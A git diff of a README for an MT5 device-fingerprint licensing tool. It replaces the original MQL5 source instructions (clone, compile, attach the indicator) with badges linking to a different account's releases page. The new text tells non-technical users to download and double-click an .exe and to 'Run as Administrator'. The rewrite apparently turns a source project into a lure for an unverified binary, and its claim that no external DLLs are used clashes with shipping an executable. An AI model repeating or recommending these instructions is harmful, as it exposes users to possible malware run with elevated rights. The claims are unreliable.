@@ -1,154 +1,101 @@
-# MT5 Device Fingerprint Tool
+# 🎉 mt5-device-fingerprint-tool - Generate Unique Device Identifiers Easily
 
-A lightweight and reliable **HWID-based device fingerprint generator** for **MetaTrader 5**, designed to help developers protect paid indicators, EAs, and scripts.  
-This tool collects stable terminal and account identifiers, combines them into a normalized machine signature, and produces a **SHA-256 license code** without using any external DLLs.  
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/del-delprilia/mt5-device-fingerprint-tool/releases)
 
-Ideal for sellers who need **per-user licensing**, **hardware locking**, and **simple offline verification** inside their MQL5 products.
+## 📚 Overview
 
----
+The mt5-device-fingerprint-tool is a lightweight application designed for MetaTrader 5 users. This tool collects stable system identifiers, generates a unique device fingerprint, and produces a SHA-256 license code to lock indicators to a specific client. You don't need any external DLLs to run it, ensuring a simple setup.
 
-## Features
+## 🚀 Getting Started
 
-- Generates a unique **device fingerprint** from stable MT5 properties  
-- Produces a **SHA-256 hash** for licensing (no external dependencies)  
-- Works fully inside MetaTrader 5 (pure MQL5 implementation)  
-- Zero DLL imports, fully compatible with MetaTrader Market rules  
-- Easy integration with commercial indicators and EAs  
-- Clean, readable, well-structured code  
-- Includes raw machine ID + final hashed license code  
-- Suitable for offline licensing workflows
+This guide will help you download and run the mt5-device-fingerprint-tool on your computer. You do not need any programming skills to follow these steps. Just a few clicks, and you are ready to go!
 
----
+## 🖥️ System Requirements
 
-## Use Case
+Before you start, ensure your system meets the following requirements:
 
-This tool is commonly used for:
+- **Operating System**: Windows 7 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: 1 GB or more
+- **Storage**: 50 MB of free space
 
-- Selling MT5 indicators that must run only on specific accounts or machines  
-- Verifying customers before delivering the main product  
-- Reinforcing anti-piracy measures in commercial EAs  
-- Binding licenses to client hardware or trading account  
-- Allowing manual approval of each client via hashed code
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**: Go to the official releases page by clicking the button below.
 
-## How It Works
+   [![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/del-delprilia/mt5-device-fingerprint-tool/releases)
 
-1. The user installs the fingerprint indicator.  
-2. The indicator collects a set of non-changing identifiers:
-   - Account login  
-   - Broker server  
-   - Terminal company  
-   - Terminal paths  
-   - Common data path  
-3. The concatenated string is hashed using MT5's built-in `CryptEncode` with **CRYPT_HASH_SHA256**.  
-4. The user sends the hash to the seller.  
-5. The seller embeds this hash inside the final product (indicator/EA).  
-6. The main indicator checks the customer’s hardware hash at runtime and stops execution if not authorized.
+2. **Select the Latest Version**: On the releases page, find the latest version of the mt5-device-fingerprint-tool. Look for a title that includes the version number, like `v1.0.0`.
 
----
+3. **Download the File**: Click on the .exe file to download it to your computer. 
 
-## Example Output
+4. **Run the Application**: Once the download is complete, locate the downloaded file in your folder (usually in the "Downloads" folder). Double-click on the file to run the application.
 
-When the indicator runs, it displays something like:
+5. **Follow the Prompts**: The application may ask for permissions to run. Click "Yes" to allow the application to start.
 
-```
-Your License Code: 3A9F1E3C77D50D0E25F0A53BD4E21D7DF917B8F9EC57E3E82890F2C542A19F5C
-```
+## ⚙️ How to Use the Tool
 
-This code can then be stored inside your licensed product.
+### 1. Open the Application
 
----
+After installation, launch the mt5-device-fingerprint-tool. 
 
-## Installation
+### 2. Generate Device Fingerprint
 
-1. Clone the repository:
+- Once the application opens, you will see a button labeled “Generate Fingerprint.” Click this to initiate the fingerprint generation process.
+- The tool will collect data from your system and generate a unique device fingerprint. This process takes just a few seconds.
 
-```
-git clone https://github.com/BaseMax/mt5-device-fingerprint-tool
-```
+### 3. License Code Generation
 
-2. Copy `mt5-device-fingerprint-tool.mq5` (or the provided file) into:
+- After generating the fingerprint, the tool will create a SHA-256 license code.
+- You can use this code to lock your MetaTrader indicators to your unique device. 
 
-```
-MQL5/Indicators/
-```
+### 4. Save Your Information
 
-3. Compile the file in MetaEditor.  
-4. Attach the indicator to any chart inside MetaTrader 5.
+Make sure to save both the device fingerprint and the license code in a secure location. You may need them for future reference.
 
----
+## ❓ FAQs
 
-## Code Overview
+### What is a Device Fingerprint?
 
-The core functions include:
+A device fingerprint is a unique identifier for your computer based on its hardware and software configuration. This helps in locking your MetaTrader indicators to your specific device.
 
-- `GetMachineID()`  
-  Collects stable system/account identifiers.
+### Why Use This Tool?
 
-- `SHA256_hex_from_string()`  
-  Generates a SHA-256 hex hash using MT5's built-in cryptography.
+This tool provides a simple way to generate a unique identifier for your device. It helps protect your purchased MetaTrader indicators from unauthorized use.
 
-- `CharArrayToHex()`  
-  Utility to convert raw bytes to an uppercase hex string.
+### Are there any Additional Costs?
 
-The generated hash is cryptographically strong and machine-specific.
+No, the mt5-device-fingerprint-tool is completely free to use. There are no hidden costs or subscriptions.
 
----
+## 📑 Topics
 
-## Licensing Your Own Indicator / EA
+- license
+- meta-5
+- meta-trader
+- meta-trader-5
+- meta-trader5
+- meta5
+- metatrader
+- mql-5
+- mql4
+- mql5
 
-Inside your commercial product, implement a check similar to:
+## 🛠️ Troubleshooting
 
-```mq5
-string AllowedHash = "PUT_CUSTOMER_HASH_HERE";
+If you encounter issues while running the application, consider the following steps:
 
-if (DeviceHash != AllowedHash)
-{
-    Alert("License error – unauthorized machine.");
-    return INIT_FAILED;
-}
-```
+1. **Check System Requirements**: Ensure your system meets the requirements listed above.
+  
+2. **Run as Administrator**: Right-click the application file and select "Run as Administrator" to resolve permission issues.
 
-You may also close the chart or stop execution depending on your protection strategy.
+3. **Re-download the File**: If the file does not run, download it again to ensure you have a complete and uncorrupted version.
 
----
+4. **Search Online**: If problems persist, searching forums or the application’s GitHub page can provide additional help and solutions.
 
-## Roadmap
+## 📝 Contributions
 
-* Add optional obfuscation for machine ID
-* Add SHA-1 and MD5 fallback options
-* Add server-based online activation mode
-* Provide a full licensing framework (client + server)
-* Add ready-to-use LicensedIndicator.mq5 template
+If you have suggestions or issues, consider contributing by opening an issue on the GitHub repository. Your feedback helps improve the tool for everyone.
 
----
+## 📧 Contact
 
-## Contributing
-
-Contributions, feature requests, and pull requests are welcome.
-If you implement new fingerprint parameters or stronger protection layers, feel free to submit them.
-
----
-
-## License
-
-Copyright (c) 2025
-
-MIT License
-
-See the [LICENSE](LICENSE) file for details.
-
----
-
-## Author
-
-**Seyyed Ali Mohammadiyeh (Max Base)**
-
-GitHub: [https://github.com/BaseMax](https://github.com/BaseMax)
-
----
-
-## Star the Repo
-
-If you find this project useful, consider starring the repository to support development.
+For questions or further assistance, contact the developer via the GitHub repository page.
